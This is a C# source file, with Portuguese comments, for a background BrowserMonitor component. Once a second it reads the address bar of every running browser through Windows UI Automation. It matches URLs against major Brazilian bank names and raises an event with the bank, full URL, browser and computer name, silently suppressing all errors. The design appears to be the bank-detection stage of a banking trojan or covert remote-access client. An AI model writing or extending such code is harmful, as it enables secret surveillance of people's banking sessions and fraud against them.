using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Automation;

namespace ClienteScreen
{
    /// <summary>
    /// Monitora navegadores para detectar acesso a sites de bancos
    /// Padrão do sistema antigo: SendUrlProc() com UI Automation
    /// </summary>
    public class BrowserMonitor
    {
        private readonly string[] _browserProcessNames = new[]
        {
            "chrome",      // Google Chrome
            "firefox",     // Mozilla Firefox
            "msedge",      // Microsoft Edge
            "opera",       // Opera
            "iexplore"     // Internet Explorer
        };

        private readonly Dictionary<string, string> _bankKeywords = new Dictionary<string, string>
        {
            { "caixa", "CEF" },
            { "bb.com.br", "BB" },
            { "bradesco", "BRADESCO" },
            { "sicredi", "SICREDI" },
            { "itau", "ITAU" },
            { "santander", "SANTANDER" }
        };

        // Armazena última URL detectada por navegador para evitar alertas duplicados
        private readonly Dictionary<string, string> _lastUrls = new Dictionary<string, string>();

        public event EventHandler<BankDetectedEventArgs> BankDetected;

        /// <summary>
        /// Inicia monitoramento contínuo de navegadores (loop infinito)
        /// </summary>
        public async Task StartMonitoring(CancellationToken cancellationToken)
        {
            Console.WriteLine("[BROWSER-MONITOR] Iniciando monitoramento de navegadores...");

            while (!cancellationToken.IsCancellationRequested)
            {
                try
                {
                    MonitorBrowsers();
                    await Task.Delay(1000, cancellationToken); // Verifica a cada 1 segundo
                }
                catch (OperationCanceledException)
                {
                    break;
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"[BROWSER-MONITOR] Erro: {ex.Message}");
                    await Task.Delay(2000, cancellationToken); // Aguarda 2s em caso de erro
                }
            }

            Console.WriteLine("[BROWSER-MONITOR] Monitoramento encerrado");
        }

        /// <summary>
        /// Verifica todos os navegadores em execução
        /// </summary>
        private void MonitorBrowsers()
        {
            foreach (var browserName in _browserProcessNames)
            {
                try
                {
                    var processes = Process.GetProcessesByName(browserName);

                    if (processes.Length == 0)
                    {
                        // Navegador não está aberto
                        _lastUrls.Remove(browserName);
                        continue;
                    }

                    // Verifica cada instância do navegador
                    foreach (var process in processes)
                    {
                        try
                        {
                            string url = GetBrowserUrl(process);

                            if (string.IsNullOrEmpty(url))
                                continue;

                            // Verifica se URL mudou desde última verificação
                            if (_lastUrls.ContainsKey(browserName) && _lastUrls[browserName] == url)
                                continue;

                            // Atualiza última URL
                            _lastUrls[browserName] = url;

                            // Detecta banco na URL
                            CheckForBankKeywords(url, browserName);
                        }
                        catch
                        {
                            // Ignora erros ao acessar processos individuais
                        }
                    }
                }
                catch
                {
                    // Ignora erros ao enumerar processos
                }
            }
        }

        /// <summary>
        /// Extrai URL do navegador usando UI Automation (igual sistema antigo)
        /// </summary>
        private string GetBrowserUrl(Process process)
        {
            if (process == null || process.MainWindowHandle == IntPtr.Zero)
                return null;

            try
            {
                // Usa UI Automation para acessar a barra de endereços
                AutomationElement element = AutomationElement.FromHandle(process.MainWindowHandle);

                if (element == null)
                    return null;

                // Procura por controle do tipo Edit (caixa de texto da URL)
                Condition conditions = new AndCondition(
                    new PropertyCondition(AutomationElement.ProcessIdProperty, process.Id),
                    new PropertyCondition(AutomationElement.IsControlElementProperty, true),
                    new PropertyCondition(AutomationElement.IsContentElementProperty, true),
                    new PropertyCondition(AutomationElement.ControlTypeProperty, ControlType.Edit)
                );

                AutomationElement urlElement = element.FindFirst(TreeScope.Descendants, conditions);

                if (urlElement == null)
                    return null;

                // Extrai valor da barra de endereços
                var pattern = urlElement.GetCurrentPattern(ValuePattern.Pattern) as ValuePattern;
                return pattern?.Current.Value;
            }
            catch
            {
                return null;
            }
        }

        /// <summary>
        /// Verifica se URL contém palavras-chave de bancos
        /// </summary>
        private void CheckForBankKeywords(string url, string browserName)
        {
            if (string.IsNullOrEmpty(url))
                return;

            string urlLower = url.ToLower();

            foreach (var kvp in _bankKeywords)
            {
                if (urlLower.Contains(kvp.Key))
                {
                    // Detectou banco!
                    string bankCode = kvp.Value;
                    string computerName = Environment.MachineName;

                    Console.WriteLine($"[BROWSER-MONITOR] BANCO DETECTADO! {bankCode} em {browserName}");
                    Console.WriteLine($"[BROWSER-MONITOR] URL: {url}");

                    // Dispara evento
                    BankDetected?.Invoke(this, new BankDetectedEventArgs
                    {
                        BankCode = bankCode,
                        Url = url,
                        BrowserName = browserName,
                        ComputerName = computerName
                    });

                    break; // Apenas um alerta por URL
                }
            }
        }
    }

    /// <summary>
    /// Argumentos do evento de detecção de banco
    /// </summary>
    public class BankDetectedEventArgs : EventArgs
    {
        public string BankCode { get; set; }        // "CEF", "BB", "ITAU", etc
        public string Url { get; set; }             // URL completa
        public string BrowserName { get; set; }     // "chrome", "firefox", etc
        public string ComputerName { get; set; }    // Nome do computador
    }
}
